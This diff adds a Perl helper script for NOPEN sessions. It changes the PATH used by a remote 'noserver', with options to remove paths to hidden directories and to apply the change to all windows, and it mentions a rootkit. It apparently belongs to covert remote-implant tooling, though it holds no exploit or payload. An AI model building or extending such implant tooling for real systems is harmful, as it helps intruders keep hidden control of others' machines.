@@ -1,0 +1,83 @@
+#!/usr/bin/env perl
+## NOPEN autoport script to add a field to the remote PATH.
+$VER="1.0.0.4" ;
+%extrapathopts = ();
+myinit() ;
+#############################
+# Determine current PATH
+#############################
+
+# If we set $allwindows true, then calls to nopenaddpath() will save
+# those paths in $opetc/norc.$nopen_rhostname, which autoscriptcheck
+# makes sure we see and use.
+#
+# But we do not want that here....or do we?  Definitely in autosurvey (rootkit).
+# $allwindows = 1;
+nopenaddpath(keys %extrapathopts,@adddirs);
+
+
+sub myinit {
+  $willautoport=1;
+  require "../etc/autoutils" ;
+  $prog = "-gs addpath" ;
+  $vertext = "$prog version $VER\n" ;
+  die("No user servicable parts inside.\n".
+	"(I.e., noclient calls $prog, not you.)\n".
+	"$vertext") unless ($nopen_rhostname and $nopen_mylog);
+  @statusoutput = ();
+  @origargv = @ARGV;
+  mydie("bad option(s)") if (! Getopts( "hveAH" ) ) ;
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $gsusagetext="Usage: $prog [-e] [ /dir [/dir2] ... ]
+
+$prog uses -setenv to add the directories on the command line to the
+beginning of the PATH noserver uses remotely (or the end if -e is used).
+
+If \".\" is given as an argument, the noserver's CWD is added to the
+PATH.
+
+OPTIONS
+
+  -h       show this usage statement
+  -H       REMOVE any paths referencing any HIDDEN directories
+  -e       add to end of path rather than default of beginning
+  -A       make this path effective for ALL windows on this host
+
+";
+  usage() if ($opt_h or $opt_v or !($ARGV[0] or $opt_H)) ;
+  $addtoend = $opt_e;
+  $allwindows = $opt_A;
+  $extrapathopts{NOHIDDEN}++ if $opt_H;
+
+  progprint("\n\n\nCalled as: $0 $gsoptions\n\n",$COLOR_FAILURE);
+  # make sure ARGV is healthy
+  @adddirs=();
+  my %donealready = ();
+  my %extrapathoptsallowed = ();
+  $extrapathoptsallowed{"NOHIDDEN"}++;
+  foreach (@ARGV) {
+      if ($extrapathoptsallowed{$_}) {
+	  $extrapathopts{$_}++;
+	  next;
+      }
+      if (! /^\// and $_ ne ".") {
+	  mywarn("Arguments must begin with a \"/\". Skipping \"$_\".");
+	  next;
+      }
+      if (/\s/) {
+	  mywarn("Arguments cannot contain whitespace. Skipping \"$_\".");
+	  next;
+      }
+      s/\/+$//;
+      push(@adddirs,$_) unless $donealready{$_}++;
+  }
+  mydie("No valid arguments provided. Aborting.") unless @adddirs or $opt_H;
+  $socket = pilotstart(quiet);
+}#myinit
